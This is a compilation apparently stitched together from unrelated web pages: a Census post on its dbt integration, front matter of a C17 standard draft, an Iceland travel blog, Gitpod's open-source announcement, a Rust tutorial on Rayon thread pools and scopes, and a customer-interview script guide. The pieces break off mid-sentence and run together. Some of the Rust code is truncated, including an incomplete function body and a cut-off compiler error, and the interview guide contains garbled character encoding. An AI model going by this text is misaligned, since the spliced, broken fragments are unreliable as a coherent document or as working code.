other applications (most of us don’t want to sync our internal staging transforms). You can configure this selector for your project (e.g. <code>path:/models/publish</code>).</li><li><strong>Sync models to destinations</strong>. The best part about our integration is that you don’t have to think about managing yet another materialization schedule. We automatically respect your existing setup, whether your dbt runner is in-house or in dbtCloud. The models you expose to Census are treated as ephemeral for our syncs so they can reference your other models without having to think about their materialization. <em>In other words, you can think of Census as responsible for materializing these models (incrementally) into your external tools like Salesforce, Customer.io, etc.</em></li></ol><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/R69F87BLyEg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>A short demo of our native dbt integration</figcaption></figure><p>As you can see in this video, it's easy to connect existing dbt projects with Census &amp; to take advantage of our integration. If you would like to migrate your existing Census models to a dbt project, reach out to our team or your dedicated CSM.</p><p>PS: We plan to do a lot more with dbt in the months to come so stay tuned :-)</p>

    This is a working document of SC22/WG14<br>
    This version of the document is intended to be the version that is to go into ballot for C17.
  </p>
  <ul>
    <li>
      It is based on the transformed LATEXversion of the document that has been proofread by the<br>
      members of WG14 and that has been approved by teleconference in June 2017.
    </li>
    <li>
      It applies all TCs of closed DRs up to April 2017.
    </li>
    <li>
      It applies the changes that have been voted in Markham.
    </li>
    <li>
      It updates some normative references.
    </li>
    <li>
      It provides the minimal changes required for a new version of the standard.
    </li>
    <li>
      It integrates some editorial changes that had been found during the revision process.
    </li>
  </ul>
  <p>
    A brief explanation of the changes could still be added to the foreword.

  <p>
    Document conventions<br>
    This document classifies identifiers into different categories. This categorization is important to<br>
    produce a correct index.<br>
    The classes are
  </p>
  <ul>
    <li>
      Normal identifiers, toto.
    </li>
    <li>
      keywords, while
    </li>
    <li>
      symbols with external linkage of the C library, malloc
    </li>
    <li>
      types, size_t
    </li>
    <li>
      predefined macros that alias language features, complex
    </li>
    <li>
      other predefined macros, EOF
    </li>
    <li>
      pragmas and their particles, STDC
    </li>
    <li>
      tag names and members of struct, union or enum, tv_sec
    </li>
    <li>
      name fragments, usually reserved prefixes, atomic_
    </li>
    <li>
      character literals, ’a’ or ’ ’ , and wide character literals, L’Ä’, string literals of char type,<br>
      "string" and u8"ströng", and string literals of wide character type, L"ströng", character<br>
      sequences thompson\0, %zu or wide character sequences hello. Space in these are visible<br>
      spaces “ ” such as in "a b c d".
    </li>
    <li>
      abstract values are written as mathematical expressions, such as 0, x, 65535 or 2n − 1.
    </li>
  </ul>
  <p>
    The classification is not always unique, we have identifiers that can refer to a library function in<br>
    math.h or to a type generic macro in tgmath.h. Currently we give preference to the fact of being a<br>
    library function, e.g we have sqrt.
  </p>

  </p>
  <p>
    This International Standard specifies the form and establishes the interpretation of programs<br>
    expressed in the programming language C. Its purpose is to promote portability, reliability, main-<br>
    tainability, and efficient execution of C language programs on a variety of computing systems.
  </p>
  <p>
    Clauses are included that detail the C language itself and the contents of the C language<br>
    execution library. Annexes summarize aspects of both of them, and enumerate factors that<br>
    influence the portability of C programs.
  </p>
  <p>
    Although this International Standard is intended to guide knowledgeable C language pro-<br>
    grammers as well as implementors of C language translation systems, the document itself is not<br>
    designed to serve as a tutorial.

			<p>We arrived in the early morning of a sunny June day.</p>
			<p>On June 14, 2016, I left the cozy, sleepy comfort of Orange County to embark on a journey. I had set my sights on my destination for a long time, having admired its natural beauty, its varied scenery, and its eccentric culture. As soon as I was able, I bought my tickets, booked my hotels, and looked toward the future eagerly – I was going to Iceland.</p>
			<p>When we arrived, the air was cool and crisp, a refreshing change from the hot and dry weather of Southern California. Though dreary from a red-eye flight, I could already feel the magic of the place. The landscape is unlike most places in the world: mostly untouched, ragged, and very volcanic. Fluorescent-green moss blankets fields of jagged volcanic rock, in a way that makes you feel like you're on another planet. But there are features that feel closer to home, like the Nordic charm of Reykjavík.</p>

			<p>We spent the first few days going to the music festival Secret Solstice 2016. The highlight of this was that we got to see Radiohead's first ever performance in Iceland, which was magical.</p>
			<p>The Hallgrímskirkja is a spectacular church perched atop the tallest point in Reykjavík. We took an elevator to the top to get a better view of our home for the next few days.</p>

			<p>Reykjavík is such an eccentric city. It feels somewhat like a Californian beachtown, but in an unmistakably Scandinavian kind of way. Unforgetable are the authentic, homely and modest architecture, the whimsical and thought-provoking street art, the delicious hot dogs, and the friendly people. After a few days of acclimating, though, we headed off to experience the untamed Icelandic wilderness.</p>
			<p>For the first stretch of the journey, we took what is known as the Golden Circle, a popular route that goes from Reykjavík to Þingvellir, Geysir, and Gullfoss, among other destinations.</p>
		</section>
		<section data-zoom-start="2">
			<h2>
				<span>Þingvellir</span>
				<span>The Continental Divide</span>
			</h2>
			<p>Þingvellir is a national park northeast of Reykjavík. Here, the North American and Eurasian tectonic plates are drifting apart, and the effect is palpable – in fact, you can stand right inbetween them. The air is calm and quiet, in contrast to the giant, craggy cliffs that sit on either side of you. We ventured a ways through the canyon, navigating boulders, foliage, and interesting clumps of moss. Sensing impending rain in the air, we decided to head to the next destination.</p>

		<section data-zoom-start="3">
			<h2>
				<span>Geysir</span>
				<span>The Great Gush</span>
			</h2>
			<p>Geysir is a geyser located not far from Þingvellir. Geysir is so prominent that the word "geyser" itself is derived from it. Unfortunately, Geysir no longer erupts frequently, and is awakened only by the occasional earthquake. However, Geysir has a few siblings, namely Strokkur, that do like to erupt quite frequently. We eagerly awaited several eruptions from Strokkur, which occurred every 10 minutes or so.</p>
			<p>A bit chilly outside, we found comfort in the heat of the steam coming from the geothermal vents around the area. After retreating to the visitor center for a quick treat, we ventured off again.</p>

			<h2>
				<span>Gullfoss</span>
			</h2>
			<p>A short drive from Geysir landed us at Gullfoss, one of the most iconic waterfalls in Iceland. Gullfoss in particular is remarkable, as it is stepped – after taking a short dive, the water plunges into a deep crevice, hurling a ton of mist into the air. You can walk down a path towards a rocky outcropping that puts you only inches from the water. Gullfoss is so forceful that you can feel the earth tremble under your boots.</p>
			<p>After this adventure, we headed back to Reykjavík one last time before our trip around the country.</p>

			<h2>
				<span>Selfoss</span>
			</h2>
			<p>The next day, we drove through the small town of Selfoss on our way down the southern edge of Iceland. Though it shares its name with a waterfall in the north of Iceland, the town contains no waterfalls. After crossing over a bridge and meandering through the town, we came upon the facility where Skyr is produced. Skyr is a yogurt-like snack (technically a soft cheese) that is often mixed with fruit. It is sold all around Iceland, and like the hot dogs, we found ourselves craving some every time we stopped to refresh ourselves.</p>

			<h2>
				<span>Seljalandsfoss</span>
			</h2>
			<p>Seljalandsfoss is one of the most photogenic waterfalls in Iceland. What makes it unlike other waterfalls is that it pours over a small cave that you can walk into. From the cave, you can walk down to the shore behind the waterfall itself. Peering up, the water is falling from directly above you. It is truly a sight to behold.</p>

			<p>We took a walk along the base of the cliff. There are several other small waterfalls that adorn the cliff, which we climbed to get a closer look.</p>

		<section data-zoom-start="3">
			<h2>
				<span>Skógafoss</span>
			</h2>
			<p>Skógafoss is another large waterfall located several kilometers from Seljalandsfoss. The force of water flowing down this waterfall is massive. It sprays a barrage of mist into the air at the bottom, preventing you from getting too close (unless you like cold showers). A trail extends up the right side of the waterfall, with a few outcroppings that you can climb on to get a better view. Climbing to the top gives you a sense of the tremendous amount of water falling down the waterfall.</p>
			<p>There is a surprising amount of wildlife at Skógafoss. Sheep and horses graze the hillsides, gulls drift through the air before perching in nests alongside the waterfall.</p>

			<h2>
				<span>Vík</span>
				<span>Black Sands</span>
			</h2>
			<p>At the southern tip of Iceland lies a small, cozy town by the name of Vík. Just west of Vík is a stretch of black sand and a small peninsula called Dyrhólaey. This is one of the most awe-inspiring places in Iceland. The Atlantic ocean batters the beach vigorously – huge waves crash, fierce winds blow, water wears away at the pitch-black volcanic rock. You can climb over some curiously-shaped basalt columns while gazing out at the ocean. In the distance stand two columns of black rock, Reynisfjara and Reynisdrangar, planted tenaciously in the ocean.</p>

			<h2>
				<span>Fjaðrárgljúfur</span>
			</h2>
			<p>After spending a night in Vík at a wonderful cabin, we set off east towards the next leg of the adventure.</p>
			<p>We stopped first at Fjaðrárgljúfur, a deep canyon in the southeast of Iceland. It is accessible by a gravel path that gave our poor rental quite a beating. A trail hugs the lip of the canyon for quite a long way. You can even travel the bed of the canyon by foot – the river that flows through it is fairly shallow. We caught a glimpse of a few travelers wading through the water, and another man with a fishing pole.</p>

			<p>We stopped next at one of the most unique locations in the world. Jökulsárlón is a lagoon at the edge of a flow from the Breiðamerkurjökull glacier. Icebergs break off of the glacier and float around in the lagoon. The air is incredibly cold and quiet, and the icebergs have a luminous blue tinge to them. Stunned by the sound of cracking ice, we witnessed an iceberg breaking in two, sending huge ripples along the smooth surface of the water.</p>

			<p>After diverging from the main road down a gravel road, we reached a natural wonder. Dettifoss is the most powerful waterfall in Europe, fed by water from the Vatnajökull glacier. The water is a greyish-brown, filled with sediment that gives it a primal look. The waterfall can be viewed from either side of the river, though both sides are unique. The eastern side is rocky and jagged, whereas the western side is lush and mossy. There are no guardrails here – you can walk up right the the edge of the water. The sheer size of the drop and the volume of water flowing are breathtaking.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As of today Gitpod is open source under the AGPL license at <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">github.com/gitpod-io/gitpod</a>. This allows the community to participate in the development of Gitpod, provides more transparency and makes it even easier for developers to use and integrate Gitpod in their workflows.</p>
<p>For those of you who know us, this probably does not come as a big surprise. Working in open source is in our DNA and everything we’ve created over the past 10 years, including <a href="https://github.com/eclipse-theia/theia" target="_blank" rel="nofollow noopener noreferrer">Theia</a>, <a href="https://github.com/eclipse/xtext" target="_blank" rel="nofollow noopener noreferrer">Xtext</a>, <a href="https://github.com/eclipse/openvsx" target="_blank" rel="nofollow noopener noreferrer">Open VSX</a> and many other projects have been open source. In fact, Gitpod was our only closed-source project and it is a relief to change that going forward.</p>

<p>Contributing to Gitpod should be easy and accessible for everyone. All contributions are welcome, including pull requests, issues, documentation as well as updates and tweaks, blog posts, tutoials, and more. Please head over to <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">Github</a> to find out about the various ways you can contribute and join our <a href="https://community.gitpod.io/" target="_blank" rel="nofollow noopener noreferrer">Gitpod Community</a>.</p>
<p>Over the past year, Gitpod has simplified contributions to many open source projects (see <a href="https://contribute.dev/" target="_blank" rel="nofollow noopener noreferrer">contribute.dev</a> for examples). Today, everyone in our team is excited to share our own streamlined development pipeline including Kubernetes preview deployments, an aggressively cached build system, our own slim and fast CI system and of course Gitpod, which continuously beams us into ready-to-code (and debug) dev environments. <a href="https://github.com/csweichel" target="_blank" rel="nofollow noopener noreferrer">Chris</a> gave a great talk about this setup earlier this year 👇</p>
<div> <p> <iframe title="" src="https://www.youtube.com/embed/dFMpXUsJcGM?rel=0" allowfullscreen=""></iframe> </p> </div>
<p>Naturally, we develop Gitpod in Gitpod. This allows the  whole team  to spin up fully initialized, remote dev environments on any branch at any time. </p>
<p>In line with the <a href="http://cloudscaling.com/blog/cloud-computing/the-history-of-pets-vs-cattle/?utm_source=thenewstack&amp;utm_medium=website&amp;utm_campaign=platform" target="_blank" rel="nofollow noopener noreferrer">pets vs. cattle</a> analogy of the cloud-native world, we treat dev environments as automated (yet customizable) resources you can spin up when you need them and close down (and forget about) when you are done with your task. Once you experience the peace of mind of automated, ephemeral dev environments you never want to go back.</p>
<p>Sven will run a webinar next week on Thursday, where we will showcase how we use Gitpod internally at Gitpod and how much it improves our workflow. Hope to see you there! </p>



<p>The <a href="https://www.gitpod.io/pricing/#" target="_blank" rel="nofollow noopener noreferrer">SaaS offering of gitpod.io</a> remains the easiest way to streamline your development workflows with continuously prebuilt dev environments. </p>
<p>In case you want to host Gitpod on your own infrastructure or private cloud, starting today, Gitpod Self-Hosted is free for unlimited users. Organizations using Gitpod Self-Hosted can purchase an enterprise license in order to get additional features like:</p>

  <p>In <a href="https://pkolaczk.github.io/disk-parallelism/">the previous post</a>, I showed how processing 
file data in parallel can either boost or hurt performance 
depending on the workload and device capabilities. Therefore, in complex programs that mix tasks
of different types using different physical resources, e.g. CPU, storage (e.g. HDD/SSD) 
or network I/O, a need may arise to configure parallelism levels differently for each task type. 
This is typically solved by scheduling tasks of different types on dedicated thread pools.
In this post I’m showing how to implement a solution in Rust with <a href="https://crates.io/crates/rayon">Rayon</a>. 
<!--more--></p>

<p>After I realized multi-threaded access to data on a single HDD is a <em>really bad idea</em>, 
I wanted to process files residing on HDD with only one thread-per-device, but still keep multithreading for SSDs.
Also, both groups of files should be processed independently, in parallel.
Honestly, that didn’t look like something hard to do. I’ve been using thread pools in Java for years.
For each file to process, I just need to schedule an asynchronous hashing task on a proper thread pool 
executor and that’s it. How hard could that be in Rust?</p>

<p>My program already used Rayon in a very functional style, so the main part of the code responsible for file hashing 
looked like that:</p>

<div><div><pre><code><span>let</span> <span>files</span><span>:</span> <span>Vec</span><span>&lt;</span><span>std</span><span>::</span><span>path</span><span>::</span><span>PathBuf</span><span>&gt;</span> <span>=</span> <span>...</span>   <span>// collection of input files</span>
<span>let</span> <span>hashes</span><span>:</span> <span>Vec</span><span>&lt;</span><span>FileHash</span><span>&gt;</span> <span>=</span> <span>files</span>
  <span>.into_par_iter</span><span>()</span>           <span>// creates a Rayon parallel iterator over all files</span>
  <span>.map</span><span>(|</span><span>f</span><span>|</span> <span>compute_hash</span><span>(</span><span>f</span><span>))</span>  <span>// reads the contents of a file and returns its hash; blocking</span>
  <span>.collect</span><span>();</span>                
</code></pre></div></div>
<p>In this approach, all the files are processed by the default Rayon thread pool and
there is no place to tell Rayon which thread pool to use for given file.</p>



<p>Rayon allows to build custom thread pools with <code>ThreadPoolBuilder</code> and <code>ThreadPool</code> structs. 
It is quite easy to create a custom thread pool and manually spawn tasks on it:</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>thread</span><span>;</span>
<span>let</span> <span>pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span>
    <span>.num_threads</span><span>(</span><span>4</span><span>)</span>
    <span>.build</span><span>()</span>
    <span>.unwrap</span><span>();</span>
<span>pool</span><span>.spawn</span><span>(||</span> <span>println!</span><span>(</span><span>"Task executes on thread: {:?}"</span><span>,</span> <span>thread</span><span>::</span><span>current</span><span>()</span><span>.id</span><span>()));</span>
<span>pool</span><span>.spawn</span><span>(||</span> <span>println!</span><span>(</span><span>"Task executes on thread: {:?}"</span><span>,</span> <span>thread</span><span>::</span><span>current</span><span>()</span><span>.id</span><span>()));</span>
</code></pre></div></div>

<p>In order to process our collection on this custom thread pool, we need to change the “main loop” of 
a program slightly and replace the parallel iterator with a traditional loop and a channel to receive the 
results:</p>

<div><div><pre><code><span>let</span> <span>pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span>
    <span>.num_threads</span><span>(</span><span>4</span><span>)</span>
    <span>.build</span><span>()</span>
    <span>.unwrap</span><span>();</span>
<span>let</span> <span>files</span><span>:</span> <span>Vec</span><span>&lt;</span><span>std</span><span>::</span><span>path</span><span>::</span><span>PathBuf</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>std</span><span>::</span><span>sync</span><span>::</span><span>mpsc</span><span>::</span><span>channel</span><span>();</span>
<span>for</span> <span>f</span> <span>in</span> <span>files</span><span>.into_iter</span><span>()</span> <span>{</span>
    <span>let</span> <span>tx</span> <span>=</span> <span>tx</span><span>.clone</span><span>();</span>  
    <span>pool</span><span>.spawn</span><span>(</span><span>move</span> <span>||</span> <span>{</span> 
        <span>tx</span><span>.send</span><span>(</span><span>compute_hash</span><span>(</span><span>f</span><span>))</span><span>.unwrap</span><span>();</span> 
    <span>});</span>
<span>}</span>
<span>drop</span><span>(</span><span>tx</span><span>);</span> <span>// need to close all senders, otherwise...</span>
<span>let</span> <span>hashes</span><span>:</span> <span>Vec</span><span>&lt;</span><span>FileHash</span><span>&gt;</span> <span>=</span> <span>rx</span><span>.into_iter</span><span>()</span><span>.collect</span><span>();</span>  <span>// ... this would block</span>
</code></pre></div></div>


<p>Now it is quite straightforward to transform this approach to more than one thread pool:</p>

<div><div><pre><code><span>let</span> <span>hdd_pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span><span>.num_threads</span><span>(</span><span>1</span><span>)</span><span>.build</span><span>()</span><span>.unwrap</span><span>();</span>
<span>let</span> <span>ssd_pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span><span>.num_threads</span><span>(</span><span>16</span><span>)</span><span>.build</span><span>()</span><span>.unwrap</span><span>();</span> 

<span>let</span> <span>files</span><span>:</span> <span>Vec</span><span>&lt;</span><span>std</span><span>::</span><span>path</span><span>::</span><span>PathBuf</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>std</span><span>::</span><span>sync</span><span>::</span><span>mpsc</span><span>::</span><span>channel</span><span>();</span>
<span>for</span> <span>f</span> <span>in</span> <span>files</span><span>.into_iter</span><span>()</span> <span>{</span>
    <span>let</span> <span>tx</span> <span>=</span> <span>tx</span><span>.clone</span><span>();</span>  
    <span>let</span> <span>pool</span> <span>=</span> <span>if</span> <span>is_on_ssd</span><span>(</span><span>&amp;</span><span>f</span><span>)</span> <span>{</span> 
        <span>&amp;</span><span>ssd_pool</span> 
    <span>}</span> <span>else</span> <span>{</span> 
        <span>&amp;</span><span>hdd_pool</span> 
    <span>};</span>
    <span>pool</span><span>.spawn</span><span>(</span><span>move</span> <span>||</span> <span>{</span> 
        <span>tx</span><span>.send</span><span>(</span><span>compute_hash</span><span>(</span><span>f</span><span>))</span><span>.unwrap</span><span>();</span> 
    <span>});</span>
<span>}</span>
<span>drop</span><span>(</span><span>tx</span><span>);</span> 
<span>let</span> <span>hashes</span><span>:</span> <span>Vec</span><span>&lt;</span><span>FileHash</span><span>&gt;</span> <span>=</span> <span>rx</span><span>.into_iter</span><span>()</span><span>.collect</span><span>();</span> 
</code></pre></div></div>

<p>The implementation of <code>is_on_ssd</code> is left as an exercise for the reader ;)</p>


<p>Unfortunately <code>ThreadPool.spawn()</code> method requires that the lambda passed to it has a 
<code>'static</code> lifetime, which means it must not borrow any data other than global. 
The examples above work only because we pass all the input data by <code>move</code>, so the lambda
does not close over anything outside and the <code>'static</code> constraint is satisfied.</p>

<p>Of course the real world is much more complex, and, in my program actually the spawned task<br>
needed to borrow the local context, which holds some common stuff like configuration or logger.</p>

<p>Referencing any outside variable from inside of <code>spawn</code> lambda does not compile:</p>
<div><div><pre><code><span>let</span> <span>logger</span><span>:</span> <span>Log</span> <span>=</span> <span>Log</span><span>::</span><span>new</span><span>();</span>
<span>let</span> <span>logger</span> <span>=</span> <span>&amp;</span><span>logger</span><span>;</span>
<span>for</span> <span>f</span> <span>in</span> <span>files</span><span>.into_iter</span><span>()</span> <span>{</span>
    <span>let</span> <span>tx</span> <span>=</span> <span>tx</span><span>.clone</span><span>();</span>
    <span>pool</span><span>.spawn</span><span>(</span><span>move</span> <span>||</span> <span>{</span>
        <span>logger</span><span>.println</span><span>(</span><span>format!</span><span>(</span><span>"Computing hash of: {}"</span><span>,</span> <span>f</span><span>.display</span><span>()));</span>
        <span>tx</span><span>.send</span><span>(</span><span>compute_hash</span><span>(</span><span>f</span><span>))</span><span>.unwrap</span><span>();</span>
    <span>});</span>
<span>}</span>
</code></pre></div></div>

<p>The compiler can’t see that all the tasks we spawned must finish before we leave the scope
where <code>logger</code> is valid. This is where Rayon scopes are coming to rescue us.</p>

<p>Instead of spawning tasks directly on the thread pool struct, we first need to create a scope 
object by calling <code>scope</code> function. The scope is guaranteed to exit only after all tasks launched 
inside it finished. This essentially allows the tasks inside the scope to access variables that live 
at least as long as the scope:</p>

<p>What about multiple thread pools? 
A single <code>Scope</code> in Rayon is always associated with a single <code>ThreadPool</code>. 
Therefore, if we need multiple thread pools, then we need multiple scopes, active at the same time.
Fortunately, scopes can be nested:</p>

<div><div><pre><code><span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>std</span><span>::</span><span>sync</span><span>::</span><span>mpsc</span><span>::</span><span>channel</span><span>();</span>
<span>let</span> <span>logger</span><span>:</span> <span>&amp;</span><span>Log</span> <span>=</span> <span>...</span><span>;</span>
<span>hdd_pool</span><span>.scope</span><span>(</span><span>move</span> <span>|</span><span>hdd_scope</span><span>|</span> <span>{</span>
    <span>ssd_pool</span><span>.scope</span><span>(</span><span>move</span> <span>|</span><span>ssd_scope</span><span>|</span> <span>{</span>
        <span>for</span> <span>f</span> <span>in</span> <span>files</span><span>.into_iter</span><span>()</span> <span>{</span>
            <span>let</span> <span>tx</span> <span>=</span> <span>tx</span><span>.clone</span><span>();</span>
            <span>if</span> <span>is_on_ssd</span><span>(</span><span>&amp;</span><span>f</span><span>)</span> <span>{</span>
              <span>ssd_scope</span><span>.spawn</span><span>(</span><span>move</span> <span>|</span><span>s</span><span>|</span> <span>{</span> <span>...</span> <span>});</span>          
            <span>}</span> <span>else</span> <span>{</span> 
              <span>hdd_scope</span><span>.spawn</span><span>(</span><span>move</span> <span>|</span><span>s</span><span>|</span> <span>{</span> <span>...</span> <span>});</span>
            <span>}</span>
        <span>}</span>
    <span>});</span>
<span>});</span>
</code></pre></div></div>

<h2 id="dynamic-number-of-thread-pools">Dynamic Number of Thread Pools</h2>
<p>With only two pools, nesting doesn’t look bad, but in my program I needed more than two pools – 
one per each physical device. And even worse, I didn’t know the number of them statically at compile time.</p>

<p>At this point I wanted to abstract out the process of creating nested scopes in a way it doesn’t pollute the 
logic of the program. I came up with the following function idea:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>multi_scope</span><span>&lt;</span><span>'scope</span><span>,</span> <span>OP</span><span>,</span> <span>R</span><span>&gt;</span><span>(</span><span>pools</span><span>:</span> <span>&amp;</span><span>[</span><span>&amp;</span><span>ThreadPool</span><span>],</span> <span>op</span><span>:</span> <span>OP</span><span>)</span> <span>-&gt;</span> <span>R</span>
<span>where</span>
    <span>OP</span><span>:</span> <span>for</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>FnOnce</span><span>(</span><span>&amp;</span><span>'s</span> <span>[</span><span>&amp;</span><span>'s</span> <span>Scope</span><span>&lt;</span><span>'scope</span><span>&gt;</span><span>])</span> <span>-&gt;</span> <span>R</span> <span>+</span> <span>'scope</span> <span>+</span> <span>Send</span><span>,</span>
    <span>R</span><span>:</span> <span>Send</span>
</code></pre></div></div>

<p>This takes an array of <code>ThreadPool</code> references, constructs a <code>Scope</code> for each <code>ThreadPool</code> 
and executes a user-defined operation (typically passed as a lambda) inside all of these scopes.
The operation receives a list of references to <code>Scope</code> so it can spawn tasks on desired <code>Scope</code> associated
with the given <code>ThreadPool</code>. The usage is quite straightforward and very similar to the built-in <code>scope</code>:</p>

<div><div><pre><code><span>use</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>;</span>

<span>let</span> <span>hdd_pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span><span>.num_threads</span><span>(</span><span>1</span><span>)</span><span>.build</span><span>()</span><span>.unwrap</span><span>();</span>
<span>let</span> <span>ssd_pool</span> <span>=</span> <span>rayon</span><span>::</span><span>ThreadPoolBuilder</span><span>::</span><span>new</span><span>()</span><span>.num_threads</span><span>(</span><span>16</span><span>)</span><span>.build</span><span>()</span><span>.unwrap</span><span>();</span> 
<span>let</span> <span>pools</span> <span>=</span> <span>[</span><span>&amp;</span><span>hdd_pool</span><span>,</span> <span>&amp;</span><span>ssd_pool</span><span>];</span> <span>// this could be constructed dynamically in real-world code</span>

<span>let</span> <span>common</span> <span>=</span> <span>vec!</span><span>[</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>];</span> <span>// common data</span>
<span>multi_scope</span><span>(</span><span>&amp;</span><span>pools</span><span>,</span> <span>|</span><span>scopes</span><span>|</span> <span>{</span>
    <span>scopes</span><span>[</span><span>0</span><span>]</span><span>.spawn</span><span>(|</span><span>s</span><span>|</span> <span>{</span> <span>/* execute on hdd_pool, can use &amp;common */</span> <span>});</span>
    <span>scopes</span><span>[</span><span>1</span><span>]</span><span>.spawn</span><span>(|</span><span>s</span><span>|</span> <span>{</span> <span>/* execute on ssd_pool, can use &amp;common */</span> <span>});</span>
<span>});</span>
</code></pre></div></div>

<p>How to implement <code>multi_scope</code>? There is no way to obtain a <code>Scope</code> value directly from Rayon.
The only way we can get a reference to a <code>Scope</code> is inside the lambda passed to <code>scope</code>.
So if we need multiple scopes active at the same time, we must nest scopes in each other. 
This sounds like a recursion.</p>

<h2 id="my-code-is-correct-but-the-borrow-checker-disagrees">My Code Is Correct, But The Borrow Checker Disagrees</h2>
<p>My initial take looked like this:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>multi_scope</span><span>&lt;</span><span>'scope</span><span>,</span> <span>OP</span><span>,</span> <span>R</span><span>&gt;</span><span>(</span><span>pools</span><span>:</span> <span>&amp;</span><span>[</span><span>&amp;</span><span>ThreadPool</span><span>],</span> <span>op</span><span>:</span> <span>OP</span><span>)</span> <span>-&gt;</span> <span>R</span>

    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>An additional function <code>nest</code> creates one new <code>Scope</code> and pushes it into the <code>scopes</code> vector, then it calls itself
recursively until it runs out of <code>ThreadPool</code> values. Finally it calls the user operation <code>op</code> 
passing the created <code>scopes</code> vector to it.</p>

<p>To my surprise that didn’t compile. Oh well!</p>
<pre>error[E0621]: explicit lifetime required in the type of `scopes`
  --&gt; src/pools.rs:42:25
   |
34 | fn nest&lt;'scope, OP, R&gt;(pools: &amp;[&amp;ThreadPool], scopes: Vec&lt;&amp;Scope&lt;'scope&gt;&gt;, op: OP) -&gt; R

...
42 |             scopes.push(s);
   |                         ^ lifetime `'scope` required

</pre>

<p>Wait, there is a hint here. As usual with Rust coding, let’s apply the hint the compiler gave to us:</p>

<div><div><pre><code><span>fn</span> <span>nest</span><span>&lt;</span><span>'scope</span><span>,</span> <span>OP</span><span>,</span> <span>R</span><span>&gt;</span><span>(</span><span>pools</span><span>:</span> <span>&amp;</span><span>[</span><span>&amp;</span><span>ThreadPool</span><span>],</span> <span>scopes</span><span>:</span> <span>Vec</span><span>&lt;&amp;</span><span>'scope</span> <span>Scope</span><span>&lt;</span><span>'scope</span><span>&gt;&gt;</span><span>,</span> <span>op</span><span>:</span> <span>OP</span><span>)</span> <span>-&gt;</span> <span>R</span>
</code></pre></div></div>

<p>But this made it only worse:</p>
<pre>error[E0495]: cannot infer an appropriate lifetime due to conflicting requirements

<p>Using a customer research script for user interviews is the best way to ensure quality research outcomes.</p>

<p>Scripts make it easier to prepare, reduce the risk of introducing bias, and produce consistent &amp; replicable insights.</p>

<p>Hereâ€™s a quick teardown of a script Iâ€™ve been using for research into how user researchers &amp; product designers leverage research for our product <a href="http://greatquestion.co/">Great Question</a>.</p>

<p>Itâ€™s very meta.</p>

<h4 id="who-is-this-for">Who is this for?</h4>
<p>This is a solid base for team relatively new to user interviews, particularly those building B2B SaaS products, but thereâ€™s likely useful ideas in here for anyone doing user research.</p>

<p>Scroll to the end if you want to download the script in its entirety.</p>

<h4 id="two-things-worth-noting">Two things worth noting:</h4>
<ol>
  <li>
    <p>The script is a guide.
Donâ€™t let the script stop you from exploring any topics or questions that might come up; often the golden insights come out from these tangents. Just make sure you come back to the script questions so you get answers to all of your questions.</p>
  </li>
  <li>
    <p>Notes or it didnâ€™t happen.
At the end of the interview tag up all of the answers so you can reference them later. Iâ€™ve used a spreadsheet with a row for each question, and Iâ€™ve also used custom UX repositories like <a href="https://dovetailapp.com/">Dovetail</a> too.</p>
  </li>
</ol>

<h3 id="preamble">Preamble:</h3>
<blockquote>
  <p>First of all thanks for taking the time to talk to us.</p>
</blockquote>

<blockquote>
  <p>As background Iâ€™m a software engineer &amp; entrepreneur, having sold my last company to GoDaddy and currently advising other companies on building scaleable products.</p>
</blockquote>

<p>You want to make it personable. Who are you and why should I be talking to you?</p>

<blockquote>
  <p>Iâ€™m now trying to scratch our own itch by making it easier for folks who build product to get closer to their customers &amp; do better quality customer research.</p>
</blockquote>

<blockquote>
  <p>Today we have a series of questions to better understand you, the work you do, and what role research takes in your organization. Weâ€™re going to start fairly broad and get more targeted as we go.</p>
</blockquote>

<p>Tell them what youâ€™re going to do up front . The start of an interview can feel quite vague.  â€œWhy are you asking me about this stuff? I thought we were going to talk about your product?â€�</p>

<blockquote>
  <p>Finally weâ€™ll finish off by giving you a brief outline of what the product actually does to see how it resonates.</p>
</blockquote>

<p>The payoff for the interview will come at the end if they just stick it out.</p>

<blockquote>
  <p>Before we start we have two pieces of house keeping.</p>
</blockquote>

<blockquote>
  <p>The first is that weâ€™re not trying to sell you anything. We just want your open and honest experiences and opinions to help us understand if there is a need for a product like this in the market.</p>
</blockquote>

<p>This is critical to a successful interview. No one wants to feel like theyâ€™re on a sales call where anything they say in the affirmative might be used against them.</p>

<blockquote>
  <p>The second is that weâ€™d like to record this call so we can focus on what youâ€™re saying and take our notes formally later. Do you mind if we record?</p>
</blockquote>

<p>Recording the interview means you can play it back for your own recollection, and to share with your team. Youâ€™ll surprise yourself how often you can misinterpret a customers comments.</p>

<p>Recording isnâ€™t always the right path - sometimes folks wonâ€™t open up as much if they know theyâ€™re being recorded - but should be a default where possible.</p>

<h3 id="interviewee-kickoff">Interviewee kickoff</h3>
<blockquote>
